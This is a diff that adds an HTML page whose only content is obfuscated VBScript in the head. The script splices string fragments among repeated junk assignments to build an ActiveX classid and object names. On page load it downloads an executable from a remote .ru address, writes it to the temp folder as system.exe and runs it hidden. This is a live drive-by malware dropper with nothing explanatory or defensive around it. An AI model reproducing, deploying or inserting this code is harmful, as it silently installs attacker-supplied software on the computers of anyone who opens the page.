@@ -1,0 +1,265 @@
+        <html><HEAD>
+
+<SCRIPT language=vbscript>
+    On Error Resume Next
+
+def="A"
+
+
+cv="ob"
+      cv1="j"
+
+      cv2="ec"
+      
+      cv3="t"
+      qaws=cv&cv1&cv2&cv3
+
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+
+er1="clsid:BD96"
+      er2="dsgsd3ds43446"
+
+      er2="C556-65A"
+      
+      er3="3-11D0-9"
+      er4="83A-00C04FC29E36"
+      er10=er1&er2&er3&er4
+
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+deffq1="Mic"
+    deffq2="34edet3453tr"
+    deffq2="roso"
+    
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    deffq3="ft."
+    deffq4="XML"
+    deffq5="HTTP"
+    deff=deffq1&deffq2&deffq3&deffq4&deffq5
+
+ac1="A"
+    ac2="afaszsfsdfsdfsdf"
+
+    ac2="dod"
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    ac3="b.S"
+    ac4="t"
+    ac5="re"
+    ac6="am"
+    strb1=ac1&ac2&ac3&ac4&ac5&ac6
+
+scripp1="Scrip"
+scripp2="tertretrtrtg"
+
+    scripp2="ting"
+
+    scripp3=".Fil"
+
+    scripp4="eSyste"
+    scripp5="mObject"
+    scripp=scripp1&scripp2&scripp3&scripp4&scripp5
+
+sh="assff"
+
+sh="Shell"
+sh1=".aseri"
+
+sh1=".Appli"
+
+sh2="ca"
+sh3="tio"
+sh4="n"
+shall=sh&sh1&sh2&sh3&sh4
+
+
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+Set dco = document.createElement(qaws)
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dco.setAttribute "classid",er10
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+Set dcomx = dco.CreateObject(deff,"")
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+set dcoas = dco.createobject(strb1,"")
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcoas.type = 1
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcomx.Open "GE"&"T", "http://bankovv.ru/admin/page/shop/exe.php", False
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcomx.Send
+set dcosfo = dco.createobject(scripp,"")
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+set tmp = dcosfo.GetSpecialFolder(2)
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    sysful15="sy"&"st"&"em.e"&"xe"
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    sysful15= dcosfo.BuildPath(tmp,sysful15)
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcoas.open
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcoas.write dcomx.responseBody
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcoas.savetofile sysful15,2
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    dcoas.close
+set dcosa = dco.createobject(shall,"")
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+    
+</SCRIPT>
+
+
+<SCRIPT language=vbscript>
+deffq1="Mic"
+    deffq2="34edet3453tr"
+    deffq2="roso"
+    deffq3="ft."
+    deffq4="XML"
+    deffq5="HTTP"
+    deff=deffq1&deffq2&deffq3&deffq4&deffq5
+dcosa.ShellExecute sysful15,"","","open",0
+def="A"
+    def1="afaszsfsdfsdfsdf"
+    def22="dod"
+    def3="b.S"
+    def4="t"
+    def5="re"
+    def6="am"
+    def7=ac1&ac2&ac3&ac4&ac5&ac6
+</SCRIPT>
+
+
+
+</HEAD>
+
+</BODY>
+</html>
